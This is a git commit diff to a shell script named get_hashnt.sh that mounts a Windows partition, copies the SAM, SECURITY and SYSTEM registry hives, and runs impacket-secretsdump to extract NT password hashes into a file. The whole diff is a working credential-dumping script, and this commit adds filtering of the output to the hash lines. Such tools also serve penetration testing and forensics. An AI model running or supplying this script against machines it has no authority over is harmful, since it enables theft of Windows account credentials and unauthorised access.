9988a7fd433d8dd5ac97ac31e661432021f32b2f
daisseur <100715068+daisseur@users.noreply.github.com>
2023-07-07 11:47:58 +0200

    Update get_hashnt.sh

--- get_hashnt.sh
+++ get_hashnt.sh
@@ -5,9 +5,6 @@ else
   part=$1
 fi
 echo "dumping hashnt from $part"
-if [[ $part == *"$(ls)"* ]]; then
-  sudo rmdir -r /mnt/$part/
-fi
 sudo mkdir /mnt/$part
 sudo mount -o ro /dev/$part /mnt/$part
 mkdir win
@@ -15,6 +12,7 @@ sudo cp /mnt/$part/$configPath/SAM ./win/SAM
 sudo cp /mnt/$part/$configPath/SECURITY ./win/SECURITY
 sudo cp /mnt/$part/$configPath/SYSTEM ./win/SYSTEM
 sudo umount /dev/$part
+sudo rmdir /mnt/$part
 # sudo apt-get install impacket-secretsdump -y > /dev/null
-sudo impacket-secretsdump -sam ./win/SAM -system ./win/SYSTEM -security ./win/SECURITY LOCAL > ./win/hashnt
+sudo impacket-secretsdump -sam ./win/SAM -system ./win/SYSTEM -security ./win/SECURITY LOCAL | grep ::: > ./win/hashnt
 cat ./win/hashnt
